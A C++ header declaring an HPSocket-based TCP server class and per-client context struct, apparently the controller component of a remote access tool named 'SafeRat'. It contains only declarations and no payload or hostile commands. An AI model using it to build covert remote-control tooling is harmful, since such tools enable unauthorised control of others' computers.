#pragma once
#include "HPSocket.h"
#include "SocketInterface.h"
#include "Buffer.h"
#include "../../common/macros.h"


struct ClientContext
{
	ULONG_PTR			m_Dialog[2];			// 放对话框列表用，第一个int是类型，第二个是CDialog的地址
	BOOL				m_bIsMainSocket;		// 是不是主socket
	CONNID              m_dwConnID;				// 唯一ID
	CBuffer				m_CompressionBuffer;	// 接收到的压缩的数据
	CBuffer				m_DeCompressionBuffer;	// 解压后的数据
	CBuffer			    m_WriteBuffer;			//发送缓冲区
	HTREEITEM           m_hItem;				// 树形结构用
	char				m_RemoteIP[50];			// 远程连接的IP
	DWORD				m_dwLineRGB;			// 颜色
	
};

class CSafeRatDlg;
typedef void (CALLBACK* NOTIFYPROC)(LPVOID, ClientContext*, UINT nCode);


class CHpTcpServer :public CTcpServerListener
{
public:
	CHpTcpServer(void);
	~CHpTcpServer(void);

	bool								m_bIsOver;		//是否结束
	CTcpPackServerPtr					m_TcpServer;
	CSafeRatDlg*						m_pFrame;
	NOTIFYPROC							m_pNotifyProc;
	CHpTcpServer*						m_spThis;


	BOOL Initialize(NOTIFYPROC pNotifyProc, CSafeRatDlg* pFrame, int nMaxConnections,int nPort,BOOL ipv6);
	int Send(ClientContext* pContext, LPBYTE lpData, UINT nSize);
	void Shutdown();
	BOOL Disconnect(ClientContext* p_ClientContext);
	BOOL GeRemoteIP(CONNID id, char *szAddress, int iAddressLen, USHORT uPort);
	BOOL SendWithSplit(CONNID dwConnID, LPBYTE lpData, UINT nSize, UINT nSplitSize);

	virtual EnHandleResult OnPrepareListen(ITcpServer* pSender, SOCKET soListen);
	virtual EnHandleResult OnAccept(ITcpServer* pSender, CONNID dwConnID, UINT_PTR soClient);
	virtual EnHandleResult OnSend(ITcpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength);
	virtual EnHandleResult OnReceive(ITcpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength);
	virtual EnHandleResult OnClose(ITcpServer* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode);
	virtual EnHandleResult OnShutdown(ITcpServer* pSender);
};






